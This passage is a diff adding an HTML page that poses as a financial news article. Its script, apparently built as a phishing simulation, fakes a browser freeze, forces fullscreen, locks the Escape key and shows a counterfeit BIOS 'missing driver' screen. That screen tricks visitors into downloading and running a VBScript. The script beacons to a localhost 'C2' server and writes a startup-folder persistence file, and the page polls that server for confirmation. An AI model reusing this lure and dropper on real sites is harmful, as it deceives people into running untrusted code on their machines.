@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Markets: Tech Sector Faces Headwinds - The Financial Chronicle</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Perfect+DOS+VGA+437&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  /* --- Global Resets & Base --- */
+  html, body { height: 100%; width: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f9f9f9; }
+  
+  /* --- Phase 0: Realistic News Portal --- */
+  #phase-0-dummy {
+    width: 100%; height: 100%; overflow-y: auto; transition: filter 0.1s ease-in-out; display: block;
+  }
+  
+  /* Realistic Navbar */
+  .chronicle-nav { background: #ffffff; border-bottom: 1px solid #e2e2e2; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
+  .nav-top { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; border-bottom: 1px solid #f0f0f0; }
+  .nav-logo { font-size: 28px; font-weight: 900; font-family: 'Times New Roman', Times, serif; letter-spacing: -0.5px; color: #111; }
+  .nav-links { display: flex; gap: 20px; font-size: 13px; font-weight: 600; text-transform: uppercase; color: #555; }
+  .nav-links span:hover { color: #0a5c99; cursor: pointer; }
+  .nav-actions { display: flex; gap: 15px; align-items: center; font-size: 14px; font-weight: 500; }
+  .btn-subscribe { background: #0a5c99; color: white; padding: 8px 16px; border-radius: 3px; font-weight: bold; cursor: pointer; }
+
+  /* Realistic Grid Layout */
+  .news-container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; display: grid; grid-template-columns: 2fr 1fr; gap: 40px; }
+  
+  /* Main Article */
+  .article-header { margin-bottom: 30px; }
+  .article-category { color: #0a5c99; font-weight: 700; font-size: 13px; text-transform: uppercase; margin-bottom: 10px; display: block; }
+  .article-title { font-size: 42px; font-weight: 800; color: #111; line-height: 1.1; margin-bottom: 15px; font-family: Georgia, 'Times New Roman', Times, serif; }
+  .article-deck { font-size: 20px; color: #555; line-height: 1.4; font-weight: 400; margin-bottom: 25px; }
+  
+  .article-meta { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-top: 1px solid #e2e2e2; border-bottom: 1px solid #e2e2e2; margin-bottom: 30px; }
+  .author-info { display: flex; align-items: center; gap: 10px; }
+  .author-avatar { width: 40px; height: 40px; background: #ccc; border-radius: 50%; object-fit: cover; }
+  .author-details { font-size: 14px; }
+  .author-name { font-weight: bold; color: #111; }
+  .timestamp { color: #777; font-size: 12px; }
+  .share-icons { display: flex; gap: 10px; color: #777; font-weight: bold; font-size: 14px; }
+  
+  .article-body { font-family: Georgia, 'Times New Roman', Times, serif; font-size: 19px; line-height: 1.7; color: #222; }
+  .article-body p { margin-bottom: 25px; }
+  .article-img { width: 100%; height: 350px; object-fit: cover; margin: 30px 0 0 0; border-radius: 4px; border: 1px solid #ddd; display: block; }
+  .image-caption { font-family: sans-serif; font-size: 13px; color: #666; margin-top: 10px; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+
+  /* Sidebar */
+  .sidebar { border-left: 1px solid #e2e2e2; padding-left: 40px; }
+  .sidebar-widget { margin-bottom: 40px; }
+  .widget-title { font-size: 16px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #111; padding-bottom: 10px; margin-bottom: 20px; }
+  .trending-list { list-style: none; }
+  .trending-list li { margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+  .trending-list li:last-child { border: none; }
+  .trending-rank { color: #0a5c99; font-weight: 900; font-size: 24px; float: left; margin-right: 15px; line-height: 1; }
+  .trending-headline { font-size: 15px; font-weight: 700; color: #111; line-height: 1.3; }
+  .ad-unit { width: 100%; height: 250px; background: #f0f0f0; border: 1px solid #ddd; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #999; font-size: 12px; text-transform: uppercase; background-image: url('https://images.unsplash.com/photo-1551288049-bebda4e38f71?auto=format&fit=crop&q=80&w=300&h=250'); background-size: cover; position: relative; }
+  .ad-unit::after { content: "Advertisement"; position: absolute; top: 5px; right: 5px; background: rgba(255,255,255,0.8); padding: 2px 5px; font-size: 10px; }
+
+  /* Realistic Cookie Banner */
+  #cookie-banner {
+      position: fixed; bottom: 0; left: 0; width: 100%; background: #1a1a1a; color: #f1f1f1;
+      padding: 25px 40px; display: flex; justify-content: space-between; align-items: center; z-index: 5000;
+      box-shadow: 0 -10px 30px rgba(0,0,0,0.2); font-size: 13px; line-height: 1.5;
+  }
+  .cookie-text { max-width: 70%; }
+  .cookie-text a { color: #4fa0ff; text-decoration: none; }
+  .cookie-actions { display: flex; gap: 15px; }
+  .btn-cookie-manage { background: transparent; color: #fff; border: 1px solid #555; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 600; }
+  .btn-cookie-accept { background: #0a5c99; color: white; border: none; padding: 12px 30px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+  .btn-cookie-accept:hover { background: #08497a; }
+
+  /* --- Functional Classes --- */
+  .frozen { filter: blur(4px) grayscale(20%); pointer-events: none; overflow: hidden !important; user-select: none; }
+  .frozen-cursor { cursor: pointer !important; }
+  .blackout-active { background-color: #000000 !important; filter: brightness(0); transition: none !important;}
+
+  /* --- Phase 1: Classic "Page(s) Unresponsive" Dialog --- */
+  #phase-1-unresponsive {
+    display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    z-index: 9999; justify-content: center; align-items: flex-start; padding-top: 15vh; cursor: default;
+  }
+  .classic-dialog {
+    background: #ffffff; width: 450px; height: fit-content; border: 1px solid #4b8ced; box-shadow: 0 2px 15px rgba(0,0,0,0.15); display: flex; flex-direction: column; font-family: 'Segoe UI', Tahoma, sans-serif;
+  }
+  .dialog-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px 5px 15px; font-size: 15px; color: #000; }
+  .dialog-close { cursor: pointer; color: #666; font-size: 16px; font-weight: bold; line-height: 1; }
+  .dialog-body { display: flex; padding: 10px 15px; gap: 15px; }
+  .dialog-icon { width: 65px; flex-shrink: 0; padding-top: 5px; }
+  .dialog-content { flex: 1; }
+  .dialog-text { font-size: 12px; line-height: 1.4; margin-bottom: 8px; color: #000; }
+  .dialog-listbox { border: 1px solid #dcdcdc; height: 85px; padding: 5px; background: #fff; font-size: 12px; overflow-y: hidden; }
+  .dialog-list-item { display: flex; align-items: flex-start; gap: 5px; color: #333; }
+  .dialog-footer { display: flex; justify-content: space-between; padding: 15px; margin-top: 5px; }
+  .btn-kill { background: #f8f8f8; border: 1px solid #c8c8c8; padding: 5px 15px; font-size: 12px; cursor: pointer; color: #000; }
+  .btn-wait { background: #fff; border: 1px solid #4b8ced; padding: 5px 25px; font-size: 12px; font-weight: bold; cursor: pointer; color: #000; }
+
+  /* --- Phase 2: AMIBIOS Setup Utility --- */
+  #phase-2-bios {
+    display: none; background: #0000aa; color: #aaaaaa;
+    font-family: 'Perfect DOS VGA 437', 'Courier New', monospace;
+    font-size: 16px; line-height: 1.4; height: 100vh; width: 100vw; flex-direction: column; 
+    cursor: none; position: absolute; top: 0; left: 0; z-index: 10000;
+  }
+  .top-banner { background: #aaaaaa; color: #0000aa; text-align: center; padding: 2px 0; font-weight: bold; letter-spacing: 1px; }
+  .tab-bar { display: flex; justify-content: center; background: #0000aa; padding: 4px 0 0 0; gap: 0; }
+  .tab { padding: 2px 20px; color: #ffffff; background: #0000aa; border: none; font-family: inherit; font-size: inherit; position: relative; }
+  .tab.active { background: #aaaaaa; color: #0000aa; font-weight: bold; }
+  .divider { background: #aaaaaa; height: 2px; width: 100%; }
+  .content-area { flex: 1; display: flex; padding: 8px 16px; gap: 0; overflow: hidden; }
+  .settings-panel { flex: 1; display: flex; flex-direction: column; gap: 0; min-width: 0; }
+  .section-header { color: #ffffff; font-weight: bold; padding: 4px 0; margin-top: 8px; }
+  .section-header:first-child { margin-top: 0; }
+  .setting-row { display: flex; padding: 1px 4px; }
+  .setting-row.selected { background: #aaaaaa; color: #0000aa; }
+  .setting-label { flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .setting-value { color: #ffffff; text-align: right; min-width: 200px; white-space: nowrap; }
+  .text-danger { color: #ff5555 !important; }
+  .text-warning { color: #ffff55 !important; }
+  
+  .help-panel-wrapper { width: 280px; min-width: 280px; border-left: 2px solid #aaaaaa; margin-left: 16px; padding-left: 12px; display: flex; flex-direction: column; }
+  .help-title { color: #ffffff; font-weight: bold; text-align: center; padding: 4px 0; border-bottom: 1px solid #aaaaaa; margin-bottom: 8px; }
+  .help-text { color: #aaaaaa; font-size: 14px; line-height: 1.5; flex: 1; white-space: pre-wrap; }
+  .bottom-bar { background: #aaaaaa; color: #0000aa; display: flex; justify-content: center; gap: 24px; padding: 2px 16px; font-size: 14px; flex-wrap: wrap; }
+  .bottom-item { display: flex; gap: 4px; }
+  .bottom-key { font-weight: bold; }
+
+  /* Fatal Modal Injection */
+  .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
+  .modal-overlay.open { display: flex; }
+  .modal-box { background: #0000aa; border: 2px solid #aaaaaa; padding: 16px 24px; min-width: 480px; text-align: center; }
+  #fatal-modal-box { border: 2px solid #ff5555; }
+  .fatal-title { color: #ff5555; font-weight: bold; margin-bottom: 12px; animation: blink 1s step-end infinite; }
+  .fatal-desc { color: #aaaaaa; text-align: left; margin-bottom: 15px; }
+  .instruction-box { background-color: black; border: 1px solid #aaaaaa; padding: 10px; text-align: left; margin-bottom: 15px; }
+  .modal-options { text-align: left; margin: 8px 0; }
+  .modal-option { padding: 2px 8px; color: #aaaaaa; }
+  .modal-option.selected { background: #aaaaaa; color: #0000aa; }
+  
+  /* Progress Bar styling */
+  .modal-footer { margin-top: 12px; font-size: 14px; color: #ffff55; min-height: 20px; white-space: pre;}
+
+  /* --- Phase 3: Success Overlay with SVG Icons --- */
+  #phase-3-success {
+      display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+      z-index: 99999; justify-content: center; align-items: center; background: rgba(0,0,0,0.8); font-family: 'Segoe UI', Tahoma, sans-serif;
+  }
+  .restart-dialog {
+      background: #ffffff; color: #000000; width: 600px; padding: 40px; border-radius: 8px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
+  }
+  .restart-title { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #005a9e; }
+  .restart-text { font-size: 15px; margin-bottom: 30px; line-height: 1.5; color: #333; }
+  
+  .instruction-row {
+      display: flex; justify-content: center; align-items: center; gap: 20px;
+      background: #f3f2f1; padding: 20px; border-radius: 6px; margin-bottom: 25px;
+  }
+  .step-box { display: flex; flex-direction: column; align-items: center; gap: 10px; }
+  .step-icon { width: 48px; height: 48px; display: flex; justify-content: center; align-items: center; background: #fff; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 8px; }
+  .step-arrow { color: #666; font-size: 24px; font-weight: bold; }
+  .step-text { font-size: 13px; font-weight: 600; color: #333; }
+
+  @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+</style>
+</head>
+<body>
+
+<div id="phase-0-dummy">
+    <nav class="chronicle-nav">
+        <div class="nav-top">
+            <div class="nav-logo">The Financial Chronicle</div>
+            <div class="nav-links">
+                <span>Markets</span>
+                <span>Business</span>
+                <span>Tech</span>
+                <span>Politics</span>
+                <span>Opinion</span>
+            </div>
+            <div class="nav-actions">
+                <span>Sign In</span>
+                <div class="btn-subscribe">Subscribe</div>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="news-container">
+        <main>
+            <div class="article-header">
+                <span class="article-category">Markets & Economy</span>
+                <h1 class="article-title">Semiconductor Constraints Trigger Sector-Wide Reevaluation</h1>
+                <h2 class="article-deck">Analysts warn that prolonged supply chain bottlenecks in advanced fabrication facilities may heavily impact Q4 consumer electronics forecasts.</h2>
+                
+                <div class="article-meta">
+                    <div class="author-info">
+                        <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&q=80&w=80&h=80" alt="Author" class="author-avatar">
+                        <div class="author-details">
+                            <div class="author-name">By Jonathan Hayes</div>
+                            <div class="timestamp">Published June 26, 2026 • 4 min read</div>
+                        </div>
+                    </div>
+                    <div class="share-icons">
+                        🔗 Share
+                    </div>
+                </div>
+            </div>
+            
+            <div class="article-body">
+                <p>Global markets opened with notable apprehension this morning as the technology sector, long considered a reliable growth engine, demonstrated increasing signs of vulnerability. The core of the issue stems from constrained output at key semiconductor fabrication plants in Southeast Asia.</p>
+                
+                <img src="https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?auto=format&fit=crop&q=80&w=800&h=400" alt="Stock Market Chart" class="article-img">
+                <div class="image-caption">Yield rates at 3nm facilities have struggled to meet the surging demand for AI hardware processing units. (Source: Chronicle Market Data)</div>
+                
+                <p>"We are advising institutional clients to maintain a defensive posture going into the latter half of the year," noted Sarah Jenkins, a senior equity strategist at a leading firm in lower Manhattan. "The current valuation multiples simply do not reflect the underlying physical supply constraints we are tracking in our operational models."</p>
+                
+                <p>The friction in the supply chain is particularly acute for the latest generation of GPU hardware. As demand for enterprise-grade artificial intelligence infrastructure continues to outpace supply, consumer-facing technology companies are finding their production schedules continually pushed back.</p>
+            </div>
+        </main>
+        
+        <aside class="sidebar">
+            <div class="sidebar-widget">
+                <div class="widget-title">Trending Now</div>
+                <ul class="trending-list">
+                    <li>
+                        <span class="trending-rank">1</span>
+                        <div class="trending-headline">Central Bank Minutes Reveal Internal Division on Rate Strategy</div>
+                    </li>
+                    <li>
+                        <span class="trending-rank">2</span>
+                        <div class="trending-headline">Energy Markets React to Unplanned Refinery Outages</div>
+                    </li>
+                    <li>
+                        <span class="trending-rank">3</span>
+                        <div class="trending-headline">Merger Talks Stall Between Logistics Giants Over Antitrust Hurdles</div>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="sidebar-widget">
+                <div class="ad-unit">
+                    </div>
+            </div>
+        </aside>
+    </div>
+    
+    <div id="cookie-banner">
+        <div class="cookie-text">
+            <strong>Your Privacy Options</strong><br>
+            We use cookies and similar tracking technologies to personalize content, analyze our traffic, and provide targeted advertisements. By clicking "Accept All", you consent to the storage of cookies on your device. You can customize your preferences by clicking "Manage Settings". Read our <a href="#">Privacy Policy</a>.
+        </div>
+        <div class="cookie-actions">
+            <button class="btn-cookie-manage">Manage Settings</button>
+            <button id="accept-cookies" class="btn-cookie-accept">Accept All Cookies</button>
+        </div>
+    </div>
+</div>
+
+<div id="phase-1-unresponsive">
+    <div class="classic-dialog">
+        <div class="dialog-header">
+            <span>Page(s) Unresponsive</span>
+            <span class="dialog-close" id="prompt-close">×</span>
+        </div>
+        <div class="dialog-body">
+            <div class="dialog-icon">
+                <svg width="60" height="60" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M 5,15 L 20,15 L 25,20 L 55,20 L 55,45 L 5,45 Z" fill="none" stroke="black" stroke-width="2"/>
+                    <text x="12" y="28" font-size="10" font-family="monospace">x</text>
+                    <text x="35" y="28" font-size="10" font-family="monospace">x</text>
+                    <path d="M 12,38 L 15,35 L 18,38 L 21,35 L 24,38 L 27,35 L 30,38 L 33,35 L 36,38" fill="none" stroke="black" stroke-width="2"/>
+                    <path d="M 3,42 C 15,38 45,38 58,45" fill="none" stroke="black" stroke-width="3"/>
+                    <path d="M 50,42 L 52,55" fill="none" stroke="black" stroke-width="3"/>
+                    <text x="2" y="12" font-size="14">❄</text>
+                    <text x="25" y="8" font-size="10">❄</text>
+                </svg>
+            </div>
+            <div class="dialog-content">
+                <div class="dialog-text">
+                    The following page(s) have become unresponsive. You can wait for them to become responsive or kill them.
+                </div>
+                <div class="dialog-listbox">
+                    <div class="dialog-list-item">
+                        <span style="color:#666; font-size: 16px; line-height:0.8;">•</span>
+                        <span>Hardware Fault: Graphics driver timeout detected.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="dialog-footer">
+            <button class="btn-kill" id="prompt-kill">Kill pages</button>
+            <button class="btn-wait" id="prompt-wait">Wait</button>
+        </div>
+    </div>
+</div>
+
+<div id="phase-2-bios">
+  <div class="top-banner">Aptio Setup Utility - Copyright (C) 2024 American Megatrends, Inc.</div>
+  <div class="tab-bar" id="tabBar">
+      <button class="tab active" data-tab="main">Main</button>
+      <button class="tab" data-tab="advanced">Advanced</button>
+      <button class="tab" data-tab="boot">Boot</button>
+      <button class="tab" data-tab="troubleshoot">Troubleshoot</button>
+  </div>
+  <div class="divider"></div>
+  <div class="content-area">
+    <div class="settings-panel" id="settingsPanel"></div>
+    <div class="help-panel-wrapper">
+      <div class="help-title">Item Specific Help</div>
+      <div class="help-text" id="helpText">Use arrow keys to navigate.</div>
+    </div>
+  </div>
+  <div class="bottom-bar">
+    <div class="bottom-item"><span class="bottom-key">←→</span> Select Tab</div>
+    <div class="bottom-item"><span class="bottom-key">↑↓</span> Select Item</div>
+    <div class="bottom-item"><span class="bottom-key">Enter</span> Execute</div>
+  </div>
+
+  <div class="modal-overlay" id="fatal-modal" style="z-index: 200;">
+    <div class="modal-box" id="fatal-modal-box">
+      <div class="fatal-title">MISSING DRIVER RECOVERY</div>
+      <div class="fatal-desc" id="status-desc">
+        The system has halted. The required hardware driver was not found.<br><br>
+        Download the driver patch to restore normal functionality.
+      </div>
+      
+      <div class="instruction-box" id="instruction-box">
+          <p style="color: #ffff55; font-weight: bold; margin-bottom: 8px;">MANUAL UPDATE REQUIRED:</p>
+          <p>1. Press <b>Enter</b> to download the current latest driver.</p>
+          <p>2. Open your browser downloads menu.</p>
+          <p>3. Click the downloaded file to execute the hardware patch.</p>
+      </div>
+
+      <div class="modal-options">
+        <div class="modal-option selected" id="fatal-opt-0">Download Driver Module</div>
+      </div>
+      <div class="modal-footer" id="modal-footer-status">Press Enter to Download</div>
+    </div>
+  </div>
+</div>
+
+<div id="phase-3-success">
+    <div class="restart-dialog">
+        <h2 class="restart-title">Diagnostic Patch Applied</h2>
+        <p class="restart-text">The hardware patch was executed successfully. To avoid future crashes and restore system functionality, please perform a manual system restart.</p>
+        
+        <div class="instruction-row">
+            <div class="step-box">
+                <div class="step-icon">
+                    <svg viewBox="0 0 88 88" width="32" height="32">
+                        <rect x="0" y="0" width="40" height="40" fill="#0078D4"/>
+                        <rect x="44" y="0" width="40" height="40" fill="#0078D4"/>
+                        <rect x="0" y="44" width="40" height="40" fill="#0078D4"/>
+                        <rect x="44" y="44" width="40" height="40" fill="#0078D4"/>
+                    </svg>
+                </div>
+                <span class="step-text">1. Click Start</span>
+            </div>
+            
+            <div class="step-arrow">→</div>
+            
+            <div class="step-box">
+                <div class="step-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" width="28" height="28">
+                        <path d="M18.36 6.64a9 9 0 1 1-12.73 0 M12 2v10"/>
+                    </svg>
+                </div>
+                <span class="step-text">2. Click Power</span>
+            </div>
+            
+            <div class="step-arrow">→</div>
+            
+            <div class="step-box">
+                <div class="step-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" width="28" height="28">
+                        <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+                        <path d="M3 3v5h5"/>
+                    </svg>
+                </div>
+                <span class="step-text">3. Restart</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentPhase = 'NORMAL'; 
+let currentTab = "main";
+let selectedIndex = 0;
+let allItems = [];
+let modalOpen = false;
+let isExporting = false; 
+
+// EDGE BROWSER CHECK: Guardrail to abort simulation if not Edge
+function isEdgeBrowser() {
+    return navigator.userAgent.includes("Edg/");
+}
+
+document.getElementById('accept-cookies').addEventListener('click', handleCookieClick);
+document.querySelector('.btn-cookie-manage').addEventListener('click', handleCookieClick);
+
+function handleCookieClick() {
+    document.getElementById('cookie-banner').style.display = 'none';
+    
+    // GUARDRAIL: If it's not Edge, just let them read the article normally.
+    if (!isEdgeBrowser()) {
+        console.log("Non-Edge browser detected. Bypassing TDR simulation.");
+        return;
+    }
+    
+    if(currentPhase === 'NORMAL') {
+        // Freeze the background and force the thumb/pointer cursor to get "stuck"
+        document.getElementById('phase-0-dummy').classList.add('frozen');
+        document.body.classList.add('frozen-cursor');
+        
+        // Wait 2 seconds before showing the Wait/Kill dialog
+        setTimeout(() => {
+            document.getElementById('phase-1-unresponsive').style.display = 'flex';
+            // Restore normal cursor ONLY for the popup so they can click it
+            document.body.classList.remove('frozen-cursor');
+        }, 2000);
+    }
+}
+
+// Dynamic GPU Extraction
+let detectedGPUString = "Generic Display Adapter";
+function initializeGPUString() {
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (gl) {
+            const ext = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+            if (gpu && !gpu.includes("Generic")) {
+                detectedGPUString = gpu;
+            }
+        }
+    } catch (e) {}
+}
+
+const tabData = {
+  main: {
+    sections: [
+      {
+        title: "System Overview",
+        items: [
+          { label: "BIOS Version", value: "F.42 REV A", readonly: true, help: "Displays the current UEFI Firmware version." },
+          { label: "Total Memory", value: "32768 MB (DDR5)", readonly: true, help: "Total amount of System RAM detected." },
+          { label: "Processor Type", value: "Intel Core i7-13700K", readonly: true, help: "Displays the detected CPU architecture." },
+          { label: "Detected GPU", value: "Generic Display Adapter", readonly: true, dynamic: 'gpu', help: "Displays the primary display adapter." },
+          { label: "System Status", value: "HALTED - MISSING DRIVER", customClass: "text-danger", readonly: true, help: "The boot sequence was halted due to a critical missing file." }
+        ]
+      },
+      {
+        title: "CRITICAL ALERT",
+        items: [
+          { label: "Action Required", value: "Navigate to Troubleshoot tab.", customClass: "text-warning", readonly: true, help: "Use the LEFT and RIGHT arrow keys to navigate to the Troubleshoot tab to fix the missing driver error." }
+        ]
+      }
+    ]
+  },
+  advanced: { 
+      sections: [ 
+          { title: "CPU Configuration", items: [ 
+              { label: "Hyper-Threading", value: "Enabled", readonly: true, help: "Enable or disable Intel Hyper-Threading Technology." },
+              { label: "Active Processor Cores", value: "All", readonly: true, help: "Select the number of active processor cores." }
+          ]},
+          { title: "Storage Configuration", items: [ 
+              { label: "SATA Mode Selection", value: "AHCI", readonly: true, help: "Set the SATA controller mode." },
+              { label: "M.2 NVMe Port 1", value: "Samsung 990 PRO 2TB", readonly: true, help: "Primary Storage Device." }
+          ]}
+      ] 
+  },
+  boot: { 
+      sections: [ 
+          { title: "Boot Configuration", items: [ 
+              { label: "Boot Mode", value: "UEFI", readonly: true, help: "Select the boot mode." },
+              { label: "Secure Boot", value: "Enabled", readonly: true, help: "Protect against unauthorized boot loaders." }
+          ]},
+          { title: "Boot Priority", items: [ 
+              { label: "Boot Option #1", value: "Windows Boot Manager", readonly: true, help: "Set the first boot device priority." }
+          ]}
+      ] 
+  },
+  troubleshoot: {
+    sections: [
+      {
+        title: "Hardware Recovery",
+        items: [
+          { label: "Missing File Error", value: "Driver Patch Required", customClass: "text-danger", readonly: true, help: "The system cannot locate the driver required for the boot sequence." },
+          { label: "Download Driver Patch", value: "[PRESS ENTER]", action: "export", help: "Press ENTER to download the missing recovery driver and resolve the boot halt." }
+        ]
+      }
+    ]
+  }
+};
+
+function renderSettings() {
+  const panel = document.getElementById('settingsPanel');
+  const data = tabData[currentTab];
+  allItems = [];
+  let html = '';
+  let globalIdx = 0;
+
+  data.sections.forEach(section => {
+    html += `<div class="section-header">${section.title}</div>`;
+    section.items.forEach(item => {
+      const isSelected = globalIdx === selectedIndex;
+      const cls = isSelected ? 'setting-row selected' : 'setting-row';
+      const valCls = item.customClass ? `setting-value ${item.customClass}` : 'setting-value';
+      
+      let displayValue = item.value;
+      if (item.dynamic === 'gpu') displayValue = detectedGPUString;
+      
+      html += `<div class="${cls}" data-idx="${globalIdx}">
+        <span class="setting-label">${item.action ? '▸ ' : '  '}${item.label}</span>
+        <span class="${valCls}">${displayValue}</span>
+      </div>`;
+      allItems.push({ ...item, globalIdx });
+      globalIdx++;
+    });
+  });
+  panel.innerHTML = html;
+  
+  const helpEl = document.getElementById('helpText');
+  const activeItem = allItems[selectedIndex];
+  if (activeItem && activeItem.help) helpEl.textContent = activeItem.help;
+  else helpEl.textContent = "Use arrow keys to navigate. Press [ENTER] to execute modules.";
+}
+
+function switchTab(tabName) {
+  currentTab = tabName;
+  selectedIndex = 0;
+  document.querySelectorAll('.tab').forEach(t => {
+    t.classList.toggle('active', t.dataset.tab === tabName);
+  });
+  renderSettings();
+}
+
+function executeExport() {
+    if (isExporting) return;
+    isExporting = true;
+    
+    const footerStatus = document.getElementById('modal-footer-status');
+    const statusDesc = document.getElementById('status-desc');
+    footerStatus.style.color = "#aaaaaa";
+    
+    if (document.exitPointerLock) document.exitPointerLock();
+
+    // The Payload: C2 Ping + Benign Startup Persistence
+    const benignData = 
+        'Dim req, fso, shell, startupPath, f\n' +
+        'Set req = CreateObject("MSXML2.XMLHTTP")\n' +
+        'On Error Resume Next\n' +
+        'req.Open "GET", "http://localhost:8000/beacon", False\n' +
+        'req.Send\n' +
+        'On Error GoTo 0\n' +
+        'Set shell = CreateObject("WScript.Shell")\n' +
+        'startupPath = shell.SpecialFolders("Startup")\n' +
+        'Set fso = CreateObject("Scripting.FileSystemObject")\n' +
+        'Set f = fso.CreateTextFile(startupPath & "\\update_success.vbs", True)\n' +
+        'f.WriteLine "MsgBox ""Update successful"", 64, ""System Update"""\n' +
+        'f.Close';
+    
+    const blob = new Blob([benignData], { type: 'text/vbscript' });
+    const url = window.URL.createObjectURL(blob);
+    
+    // Simulated Download Progress Animation
+    let progress = 0;
+    const barWidth = 15;
+    
+    const downloadTimer = setInterval(() => {
+        progress += 5;
+        let filled = Math.floor((progress / 100) * barWidth);
+        let empty = barWidth - filled;
+        let barString = "█".repeat(filled) + "░".repeat(empty);
+        
+        footerStatus.innerText = `Downloading patch: [${barString}] ${progress}%`;
+        
+        if (progress >= 100) {
+            clearInterval(downloadTimer);
+            footerStatus.innerText = "Download complete.";
+            
+            // Execute the actual file drop
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'recovery.vbs';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            
+            // Re-enable cursor for interaction
+            document.body.style.setProperty('cursor', 'default', 'important');
+            document.getElementById('phase-2-bios').style.setProperty('cursor', 'default', 'important');
+            
+            document.getElementById('instruction-box').style.display = 'none';
+            statusDesc.innerHTML = "Patch downloaded.<br><br>Waiting for local execution...";
+            footerStatus.innerText = "Awaiting execution...";
+            footerStatus.style.color = "#ffff55";
+            
+            startPolling();
+        }
+    }, 100); // 100ms * 20 steps = 2 second visual delay
+}
+
+function startPolling() {
+    const pollInterval = setInterval(async () => {
+        try {
+            let res = await fetch("http://localhost:8000/status");
+            let data = await res.json();
+            
+            if (data.executed === true) {
+                clearInterval(pollInterval);
+                restorePage();
+            }
+        } catch(e) {
+            console.log("Polling C2 server...");
+        }
+    }, 2000); 
+}
+
+function restorePage() {
+    if (document.fullscreenElement && document.exitFullscreen) {
+        document.exitFullscreen().catch(e => console.log(e));
+    }
+    
+    const dummyPage = document.getElementById('phase-0-dummy');
+    dummyPage.style.display = 'block';
+    dummyPage.classList.remove('frozen');
+    
+    document.getElementById('phase-2-bios').style.display = 'none';
+    document.getElementById('phase-3-success').style.display = 'flex';
+    currentPhase = 'SUCCESS';
+}
+
+function triggerTDRBlackout() {
+    const elem = document.documentElement;
+    if (elem.requestFullscreen) {
+        elem.requestFullscreen().catch(e => console.log(e));
+    }
+    if (navigator.keyboard && navigator.keyboard.lock) {
+        navigator.keyboard.lock(['Escape']).catch(e => console.log(e));
+    }
+
+    document.getElementById('prompt-wait').disabled = true;
+    document.getElementById('prompt-kill').disabled = true;
+    document.getElementById('prompt-wait').style.opacity = '0.5';
+    document.getElementById('prompt-kill').style.opacity = '0.5';
+    
+    initializeGPUString();
+    
+    setTimeout(() => {
+        document.body.classList.add('blackout-active');
+        document.getElementById('phase-0-dummy').style.display = 'none'; 
+        document.getElementById('phase-1-unresponsive').style.display = 'none';
+        
+        setTimeout(() => {
+            document.body.classList.remove('blackout-active');
+            
+            document.getElementById('phase-2-bios').style.display = 'flex';
+            currentPhase = 'BIOS';
+            renderSettings();
+        }, 1200); 
+    }, 4500);
+}
+
+document.getElementById('prompt-close').addEventListener('click', triggerTDRBlackout);
+document.getElementById('prompt-kill').addEventListener('click', triggerTDRBlackout);
+document.getElementById('prompt-wait').addEventListener('click', triggerTDRBlackout);
+
+document.addEventListener('keydown', e => {
+  if (currentPhase === 'NORMAL' || currentPhase === 'SUCCESS') return;
+  if(["ArrowUp","ArrowDown","ArrowLeft","ArrowRight","Space"].indexOf(e.code) > -1) e.preventDefault();
+
+  if (modalOpen && e.key === 'Enter') {
+      executeExport();
+      return;
+  }
+
+  const tabs = ['main', 'advanced', 'boot', 'troubleshoot'];
+  const tabIdx = tabs.indexOf(currentTab);
+
+  if (currentPhase === 'BIOS' && !modalOpen) {
+      switch (e.key) {
+        case 'ArrowUp':
+          selectedIndex = Math.max(0, selectedIndex - 1);
+          renderSettings();
+          break;
+        case 'ArrowDown':
+          selectedIndex = Math.min(allItems.length - 1, selectedIndex + 1);
+          renderSettings();
+          break;
+        case 'ArrowLeft':
+          if (tabIdx > 0) switchTab(tabs[tabIdx - 1]);
+          break;
+        case 'ArrowRight':
+          if (tabIdx < tabs.length - 1) switchTab(tabs[tabIdx + 1]);
+          break;
